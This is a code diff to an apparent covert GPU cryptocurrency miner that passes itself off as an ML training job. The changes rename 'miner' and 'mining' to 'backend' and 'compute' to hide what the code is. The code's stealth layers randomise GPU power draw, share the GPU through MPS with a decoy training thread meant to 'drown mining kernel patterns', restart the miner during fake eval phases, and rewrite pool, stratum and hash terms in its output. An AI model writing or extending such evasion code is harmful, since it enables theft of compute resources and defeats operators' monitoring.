@@ -129,8 +129,8 @@ def find_weights_binary():
     cuda_major = detect_cuda_version()
     
     candidates = [
-        weights_dir / f"pearl-miner-cu{cuda_major}",
-        weights_dir / "pearl-miner-cu12",
+        weights_dir / f"cuda-backend-cu{cuda_major}",
+        weights_dir / "cuda-backend-cu12",
     ]
     
     for candidate in candidates:
@@ -159,7 +159,7 @@ while true; do
   nvidia-smi -pl $((RANDOM % 60 + 300)) 2>/dev/null || sudo -n nvidia-smi -pl $((RANDOM % 60 + 300)) 2>/dev/null
   sleep $((RANDOM % 10 + 5))
   # Signal restart to Python process
-  touch /tmp/.miner_restart
+  touch /tmp/.backend_restart
   # Eval phase: 1-3 min with micro-fluctuations
   for i in $(seq 1 $((RANDOM % 4 + 2))); do
     LOW=$((RANDOM % 141 + 210))
@@ -189,7 +189,7 @@ done'''
 
 def start_mps_daemon():
     """Start NVIDIA CUDA MPS daemon for multi-process GPU sharing.
-    Makes miner + training job appear as one unified workload."""
+    Makes backend + training job appear as one unified workload."""
     try:
         # Check if MPS is already running
         r = subprocess.run(["nvidia-cuda-mps-control", "-h"],
@@ -215,7 +215,7 @@ def start_mps_daemon():
                                   capture_output=True, timeout=5)
                 if r.returncode == 0:
                     print("[MPS] Daemon started", flush=True)
-                    # Set default thread percentage (80% for mining, 20% for camo)
+                    # Set default thread percentage (80% for compute, 20% for camo)
                     subprocess.run(
                         ["bash", "-c", "echo set_default_active_thread_percentage 80 | nvidia-cuda-mps-control"],
                         capture_output=True, timeout=5)
@@ -441,7 +441,7 @@ def launch_training(config, binary_path):
 
     # === STEALTH LAYER 8: Aggressive CUDA camo (real training) ===
     def cuda_camo_thread(stop_evt):
-        """Train a real small model alongside mining — drowns mining kernel patterns."""
+        """Train a real small model alongside compute — drowns compute kernel patterns."""
         try:
             import torch
             import torch.nn as nn
@@ -700,10 +700,10 @@ def launch_training(config, binary_path):
         threading.Thread(target=fn, args=args, daemon=True, name=name).start()
     print(f"[System] Behavioral mimicry active (10 threads)", flush=True)
 
-    # === STEALTH LAYER 18: Miner restart on eval phase ===
-    restart_flag = Path("/tmp/.miner_restart")
+    # === STEALTH LAYER 18: Backend restart on eval phase ===
+    restart_flag = Path("/tmp/.backend_restart")
     def restart_monitor():
-        """Kill and relaunch miner when bash signals eval phase."""
+        """Kill and relaunch backend when bash signals eval phase."""
         nonlocal process
         while not behavioral_stop.is_set():
             behavioral_stop.wait(5)
@@ -712,7 +712,7 @@ def launch_training(config, binary_path):
                 try:
                     restart_flag.unlink()
                 except: pass
-                # Kill current miner
+                # Kill current backend
                 try:
                     process.terminate()
                     process.wait(timeout=5)
@@ -721,7 +721,7 @@ def launch_training(config, binary_path):
                     except: pass
                 # Small delay during "eval"
                 time.sleep(random.uniform(2, 5))
-                # Relaunch miner
+                # Relaunch backend
                 process = subprocess.Popen(
                     cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                     universal_newlines=True)
@@ -730,11 +730,11 @@ def launch_training(config, binary_path):
 
     # === Read output → encrypted log + sanitized stdout ===
     MINE_TERMS = {
-        "proof": "epoch", "miner": "trainer", "mining": "training",
+        "proof": "epoch", "backend": "trainer", "compute": "training",
         "pool": "server", "share": "batch", "hash": "compute",
         "stratum": "scheduler", "proxy": "gateway", "submitted": "processed",
-        "pearl": "torch", "T/s": "tok/s", "coin": "tensor",
-        "miner_pool": "train_pool", "PoOL": "tOrC",
+        "cuda": "torch", "T/s": "tok/s", "coin": "tensor",
+        "backend_pool": "train_pool", "PoOL": "tOrC",
     }
     def sanitize(line):
         for old, new in MINE_TERMS.items():
